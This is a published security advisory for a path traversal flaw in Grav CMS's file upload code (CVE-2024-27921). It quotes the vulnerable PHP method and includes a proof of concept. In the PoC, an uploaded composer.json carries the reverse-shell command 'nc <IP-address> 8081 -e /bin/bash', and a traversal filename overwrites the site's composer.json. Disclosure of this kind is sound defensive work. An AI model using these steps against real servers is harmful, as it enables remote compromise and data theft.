# [H] Grav File Upload Path Traversal

## Summary
Severity: High
Advisory: GHSA-m7hx-hw6h-mqmc
CVE: CVE-2024-27921
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-03-22
Source: https://github.com/advisories/GHSA-m7hx-hw6h-mqmc
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <1.7.45

## Details
### Summary
Grav is vulnerable to a file upload path traversal vulnerability, that can allow an adversary to replace or create files with extensions such as .json, .zip, .css, .gif, etc. This vulnerabiltiy can allow attackers to inject arbitrary code on the server, undermine integrity of backup files by overwriting existing backups or creating new ones, and exfiltrating sensitive data using CSS Injection exfiltration techniques.

### Installation Configuration
- Grav CMS 1.10.44
- Apache web server
- php-8.2

### Details
_**Vulnerable code location:**_ grav/system/src/Grav/Common/Media/Traits/MediaUploadTrait.php/checkFileMetadata() method_

    public function checkFileMetadata(array $metadata, string $filename = null, array $settings = null): string
    {
        // Add the defaults to the settings.
        $settings = $this->getUploadSettings($settings);

        // Destination is always needed (but it can be set in defaults).
        $self = $settings['self'] ?? false;
        if (!isset($settings['destination']) && $self === false) {
            throw new RuntimeException($this->translate('PLUGIN_ADMIN.DESTINATION_NOT_SPECIFIED'), 400);
        }

        if (null === $filename) {
            // If no filename is given, use the filename from the uploaded file (path is not allowed). 
            $folder = '';
            $filename = $metadata['filename'] ?? '';
        } else {
            // If caller sets the filename, we will accept any custom path.
            $folder = dirname($filename); `-> Vulnerable Code`
            if ($folder === '.') {
                $folder = '';
            }
            $filename = Utils::basename($filename);

### PoC

1. Log in to the Grav CMS using a super administrator account.
2. Add a user in the "Accounts" section with the following permissions:
- Login to Admin
- Page Update
3. Log out of the super administrator account and log in with the previously created user account.
4. Navigate to the https://<grav>admin/pages/home.
5. Use the following command in Kali Linux to open a netcat listener:
```
nc -lvnp 8081
```
![image](https://user-images.githubusercontent.com/48800246/296318900-cc257c4f-e67e-45af-a2a1-1ee5d7e6d165.png)
Note: "nc" or netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP. We are using this tool to get a reverse shell from the server hosting Grav CMS.
7. Using a web interception proxy, click on the "Page Media" section and upload a json file with the following added to the "scripts" section (https://getcomposer.org/doc/articles/scripts.md):
```
"post-install-cmd": "nc <IP-address> 8081 -e /bin/bash",
"post-update-cmd": "nc <IP-address> 8081 -e /bin/bash"
```
**_Note:_** The post installation and update script used in this PoC is only for demonstration purposes. There are various other scripts that may be injected such as `command` that executes the corresponding script before any Composer Command is executed on the CLI.
![image](https://user-images.githubusercontent.com/48800246/296317602-89fe155d-34a7-4b35-a6b4-d1964057ce65.png)
_Note: . Please replace <IP-address> with the IP address of the Kali Linux netcat listener._
8. Modify the "name" parameter to "../../../c/omposer.json" and forward the request.
9. Observe the successful upload message from the server response:
![image](https://user-images.githubusercontent.com/48800246/296320057-fcc0d456-c282-42eb-bcf0-1155d4b5d24a.png)
10. In the Grav web root, observe that the "composer.json" file was successfully replaced by the malicious "composer.json" file containing a reverse shell script.
11. Run any variations of the following commands in the Grav web server and observe the successful reverse shell:
- bin/grav composer
- composer update
- composer install
![image](https://user-images.githubusercontent.com/48800246/296322101-5654dee4-44ba-4806-9dc7-25d8e0240486.png)

### Impact

1. **Arbitrary Code Injection:** Attackers can replace the composer.json file with a malicious one containing arbitratry composer scripts. This can result in code execution when the `composer` command is used for any purpose in the server.  that can allow attackers to get a reverse shell on the server.

2. **Backup Compromise:** .zip backup files can be replaced, undermining data integrity and recovery mechanisms:
![image](https://github.com/getgrav/grav/assets/48800246/94ab1546-a576-43a7-ac6e-f72acee74fb8)
![image](https://github.com/getgrav/grav/assets/48800246/7f29b597-ca17-4e17-a949-c8658e567caa)

3. **Sensitive Information Exposure:** Modification of .css files provides an avenue for attackers to exfiltrate sensitive information, such as usernames and passwords, compromising confidentiality.
![image](https://github.com/getgrav/grav/assets/48800246/ed492d7b-0776-4a56-8b8f-fde7b8c9ea99)

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-m7hx-hw6h-mqmc
- https://nvd.nist.gov/vuln/detail/CVE-2024-27921
- https://github.com/getgrav/grav/commit/5928411b86bab05afca2b33db4e7386a44858e99
- https://github.com/getgrav/grav
